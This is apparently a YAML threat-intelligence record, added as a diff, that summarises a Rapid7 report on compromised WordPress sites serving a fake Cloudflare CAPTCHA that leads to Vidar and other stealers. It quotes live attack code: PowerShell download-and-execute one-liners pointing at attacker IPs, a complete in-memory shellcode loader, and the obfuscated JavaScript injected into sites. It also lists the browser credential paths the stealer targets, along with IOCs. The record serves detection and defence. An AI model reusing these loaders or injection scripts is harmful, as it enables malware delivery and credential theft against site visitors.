@@ -1,0 +1,150 @@
+description: Unidentified threat actor compromised WordPress websites to inject ClickFix
+  implant impersonating a Cloudflare CAPTCHA, leading to multi-stage malware chain
+  including Vidar stealer, Impure Stealer, and VodkaStealer.
+malware_families:
+- Vidar
+- Impure Stealer
+- VodkaStealer
+- DoubleDonut Loader
+- Vidar Stealer
+TTPs:
+  processes:
+  - powershell.exe
+  - svchost.exe
+  - cmd.exe
+  commandline:
+  - powershell -c iex(irm 91.92.240[.]219 -UseBasicParsing)
+  - '"powershell.exe" -Command "try {$finalPayload = iwr -Uri \"178.16.53[.]70\" -UseBasicParsingInvoke-Expression
+    $finalPayload.Content} catch {}"'
+  - powershell -c iex(irm 94.154.35[.]115/user_profiles_photo/cptch.bin -UseBasicParsing)
+  - '"powershell.exe" -Command "try {    $finalPayload = iwr -Uri \"178.16.53[.]70\"
+    -UseBasicParsing    Invoke-Expression $finalPayload.Content} catch {}"'
+  - Write-Host "Loading..."     $d = Invoke-WebRequest -Uri $u -UseBasicParsing -ErrorAction
+    Stop    $b = $d.Content    $s = $b.Length    $c = @"using System;using System.Runtime.InteropServices;public
+    class W {    [DllImport("kernel32.dll", SetLastError=true)]    public static extern
+    IntPtr GetCurrentProcess();    [DllImport("kernel32.dll", SetLastError=true)]    public
+    static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);    [DllImport("kernel32.dll",
+    SetLastError=true)]    public static extern IntPtr CreateThread(IntPtr ta, uint
+    ss, IntPtr sa, IntPtr p, uint cf, out uint tid);    [DllImport("kernel32.dll",
+    SetLastError=true)]    public static extern uint WaitForSingleObject(IntPtr h,
+    uint ms);}@"    Add-Type -TypeDefinition $c    $m1 = 0x1000    $m2 = 0x2000    $p
+    = 0x40    $addr = [W]::VirtualAlloc([IntPtr]::Zero, $s, $m1 -bor $m2, $p)    if
+    ($addr -eq [IntPtr]::Zero) {        throw "Alloc failed"    }    [System.Runtime.InteropServices.Marshal]::Copy($b,
+    0, $addr, $s)    $tid = 0    $th = [W]::CreateThread([IntPtr]::Zero, 0, $addr,
+    [IntPtr]::Zero, 0, [ref]$tid)    if ($th -eq [IntPtr]::Zero) {        throw "Thread
+    failed"    }    [W]::WaitForSingleObject($th, 30000) | Out-Null    Write-Host
+    "done."} catch {    Write-Error $_.Exception.Message    exit 1}
+  - if(!window.__performance_optimizer_v6){    window.__performance_optimizer_v6=true;if(!/wordpress_logged_in_/.test(document.cookie)){var
+    perfEndpoints=["aHR0cHM6Ly9nb3ZlYW5ycy5vcmcvanNyZXBvP3JuZD0=","aHR0cHM6Ly9nZXRhbGliLm9yZy9qc3JlcG8\/cm5kPQ==","aHR0cHM6Ly9nb3ZlYXJhbGkub3JnL2pzcmVwbz9ybmQ9","aHR0cHM6Ly9saWdvdmVyYS5zaG9wL2pzcmVwbz9ybmQ9","aHR0cHM6Ly9hbGlhbnplZy5zaG9wL2pzcmVwbz9ybmQ9","aHR0cHM6Ly96dGRhbGl3ZWIuc2hvcC9qc3JlcG8\/cm5kPQ=="];function
+    loadPerformanceScript(endpointIndex){if(endpointIndex>=perfEndpoints.length)return;try{var
+    endpointUrl=atob(perfEndpoints[endpointIndex])+Math.random();var performanceXHR=new
+    XMLHttpRequest();                performanceXHR.open("GET",endpointUrl,false);                performanceXHR.send();if(performanceXHR.status==200){var
+    optimizerScript=document.createElement("script");                    optimizerScript.text=performanceXHR.responseText;                    document.head.appendChild(optimizerScript)                }else{                    loadPerformanceScript(endpointIndex+1)                }            }catch(e){                loadPerformanceScript(endpointIndex+1)            }        }        loadPerformanceScript(0)    }}
+  powershell:
+  - iex(irm 91.92.240[.]219 -UseBasicParsing)
+  - try {$finalPayload = iwr -Uri "178.16.53[.]70" -UseBasicParsingInvoke-Expression
+    $finalPayload.Content} catch {}
+  - $u = "hxxp[://]94.154.35[.]115/user_profiles_photo/cptch.bin"
+  - using System;using System.Runtime.InteropServices;public class W {[DllImport("kernel32.dll",
+    SetLastError=true)]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32.dll",
+    SetLastError=true)]public static extern IntPtr VirtualAlloc(IntPtr a, uint sz,
+    uint t, uint p);[DllImport("kernel32.dll", SetLastError=true)]public static extern
+    IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint
+    tid);[DllImport("kernel32.dll", SetLastError=true)]public static extern uint WaitForSingleObject(IntPtr
+    h, uint ms);}
+  - try {    $finalPayload = iwr -Uri "178.16.53[.]70" -UseBasicParsing    Invoke-Expression
+    $finalPayload.Content} catch {}
+  - Write-Host "Loading..."     $d = Invoke-WebRequest -Uri $u -UseBasicParsing -ErrorAction
+    Stop    $b = $d.Content    $s = $b.Length    $c = @"using System;using System.Runtime.InteropServices;public
+    class W {    [DllImport("kernel32.dll", SetLastError=true)]    public static extern
+    IntPtr GetCurrentProcess();    [DllImport("kernel32.dll", SetLastError=true)]    public
+    static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);    [DllImport("kernel32.dll",
+    SetLastError=true)]    public static extern IntPtr CreateThread(IntPtr ta, uint
+    ss, IntPtr sa, IntPtr p, uint cf, out uint tid);    [DllImport("kernel32.dll",
+    SetLastError=true)]    public static extern uint WaitForSingleObject(IntPtr h,
+    uint ms);}@"    Add-Type -TypeDefinition $c    $m1 = 0x1000    $m2 = 0x2000    $p
+    = 0x40    $addr = [W]::VirtualAlloc([IntPtr]::Zero, $s, $m1 -bor $m2, $p)    if
+    ($addr -eq [IntPtr]::Zero) {        throw "Alloc failed"    }    [System.Runtime.InteropServices.Marshal]::Copy($b,
+    0, $addr, $s)    $tid = 0    $th = [W]::CreateThread([IntPtr]::Zero, 0, $addr,
+    [IntPtr]::Zero, 0, [ref]$tid)    if ($th -eq [IntPtr]::Zero) {        throw "Thread
+    failed"    }    [W]::WaitForSingleObject($th, 30000) | Out-Null    Write-Host
+    "done."} catch {    Write-Error $_.Exception.Message    exit 1}
+  - if(!window.__performance_optimizer_v6){    window.__performance_optimizer_v6=true;if(!/wordpress_logged_in_/.test(document.cookie)){var
+    perfEndpoints=["aHR0cHM6Ly9nb3ZlYW5ycy5vcmcvanNyZXBvP3JuZD0=","aHR0cHM6Ly9nZXRhbGliLm9yZy9qc3JlcG8\/cm5kPQ==","aHR0cHM6Ly9nb3ZlYXJhbGkub3JnL2pzcmVwbz9ybmQ9","aHR0cHM6Ly9saWdvdmVyYS5zaG9wL2pzcmVwbz9ybmQ9","aHR0cHM6Ly9hbGlhbnplZy5zaG9wL2pzcmVwbz9ybmQ9","aHR0cHM6Ly96dGRhbGl3ZWIuc2hvcC9qc3JlcG8\/cm5kPQ=="];function
+    loadPerformanceScript(endpointIndex){if(endpointIndex>=perfEndpoints.length)return;try{var
+    endpointUrl=atob(perfEndpoints[endpointIndex])+Math.random();var performanceXHR=new
+    XMLHttpRequest();                performanceXHR.open("GET",endpointUrl,false);                performanceXHR.send();if(performanceXHR.status==200){var
+    optimizerScript=document.createElement("script");                    optimizerScript.text=performanceXHR.responseText;                    document.head.appendChild(optimizerScript)                }else{                    loadPerformanceScript(endpointIndex+1)                }            }catch(e){                loadPerformanceScript(endpointIndex+1)            }        }        loadPerformanceScript(0)    }}
+  scripting_engine:
+  - JavaScript
+  registry_keys:
+  - HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools
+  - HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions
+  - HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters
+  - HKLM\\SYSTEM\\CurrentControlSet\Services\\VBoxGuest
+  - HKLM\\SYSTEM\\CurrentControlSet\\Services\\vmci
+  - HKLM\\SYSTEM\\CurrentControlSet\\Services\\vmmouse
+  image_load:
+  - gdiplus.dll
+  network_connections:
+  - powershell.exe, 91.92.240[.]219, 80
+  - svchost.exe, 94.154.35[.]115, 80
+  - powershell.exe, 178.16.53[.]70, 80
+  - get_ip_info
+  - http://ip-api.com/json
+  file_activity:
+  - /wp-admin/admin-ajax.php?action=ajjs_run
+  - '%Temp%\sysinfo_user_marker.marker'
+  - '%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data'
+  - '%LocalAppData%\\Microsoft\\Edge\\User Data\\Default\\Login Data'
+  - '%LocalAppData%\\BraveSoftware\\Brave-Browser\\Default\\Login Data'
+  - '%LocalAppData%\\Opera Software\\Opera Stable\\Login Data'
+  - '%LocalAppData%\\Vivaldi\\User Data\\Default\\Login Data'
+  - '%LocalAppData%\\Yandex\\Yandex\\User Data\\Default\\Login Data'
+  - '%LocalAppData%\\Chromium\\User Data\\Default\\Login Data'
+  - '%Temp%\chromelevator_output'
+  persistence:
+  - Mutex Global\sysinfo_single_instance
+  process_relations:
+  - powershell.exe -> svchost.exe
+  - powershell.exe->svchost.exe
+IOCs:
+  hashes:
+  - <hash from IoCs section for Vidar sample>
+  ip_addresses:
+  - 91.92.240[.]219
+  - 178.16.53[.]70
+  - 94.154.35[.]115
+  - 172.94.9[.]187
+  domains:
+  - phatapunjab[.]pk
+  - missionloans[.]com
+  - wepro[.]ch
+  - mrfpaint[.]com
+  - gieable[.]shop
+  - namsioc[.]shop
+  - goarnsds[.]shop
+  - surveygifts[.]org
+  - gorscts[.]shop
+  - greecpt[.]shop
+  - captoolsz[.]com
+  - captioz[.]shop
+  - namzcp[.]org
+  - cptoptious[.]com
+  - captiort[.]shop
+  - beta-charts[.]org
+  - captioto[.]com
+  - capztoolz[.]com
+  - medsnsw[.]com
+  - ip-api.com
+  urls:
+  - hxxps[://]phatapunjab[.]pk/new-pta-tax-for-used-iphone-15-series/
+  - hxxps[://]94.154.35[.]115/user_profiles_photo/cptch.bin
+  - hxxps[://]dakarailarriett[.]com/wp-admin/admin-ajax.php?action=ajjs_run
+  - hxxp://94.154.35[.]115/user_profiles_photo/cptch.bin
+  - http://ip-api.com/json
+authors:
+- Rapid7 Labs
+reference: https://www.rapid7.com/blog/post/tr-malicious-websites-wordpress-compromise-advances-global-stealer-operation
+date_of_publication: March 10, 2026
+file_creation_date: March 14, 2026
